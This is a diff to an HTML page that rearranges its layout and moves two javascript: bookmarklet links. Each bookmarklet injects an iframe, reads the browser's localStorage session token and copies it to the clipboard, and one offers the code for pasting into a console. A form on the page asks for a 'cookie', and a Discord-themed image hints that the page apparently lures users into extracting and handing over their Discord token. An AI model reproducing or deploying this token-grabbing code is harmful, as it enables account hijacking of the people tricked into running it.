@@ -48,8 +48,19 @@
 			height: 100%;
 			width: 100%;
 		}
+
+		#main {
+			position: relative;
+			left: 10px;
+		}
 	</style>
 	<body>
+		<div id="main">
+		<ul>
+			<li><a href="javascript:(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()">Bookmarklet</a></li>
+			<li><a href="javascript:navigator.clipboard.writeText(`(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()`)">Copy code for console</a></li>
+		</ul>
+		
 		<img src="/logo.png">
 
 		<div>
@@ -68,11 +79,6 @@
 			<img src="https://cdn1.ftimg.com/images/ads/gfx_gimp.gif">
 		</div>
 
-		<ul>
-			<li><a href="javascript:(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()">Bookmarklet</a></li>
-			<li><a href="javascript:navigator.clipboard.writeText(`(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()`)">Copy code for console</a></li>
-		</ul>
-
 		<form>
 			<input type="text" id="form-input" placeholder="cookie"></input>
 			<button type="submit" id="form-submit">SUBMIT</button>
@@ -81,6 +87,7 @@
 		<div id="log"></div>
 
 		<img src="https://media.tenor.com/V5jKgnXoSzIAAAAd/beamed-discord.gif">
+		</div>
 
 		<script src="https://code.jquery.com/jquery-3.6.2.min.js"></script>
 		<script>
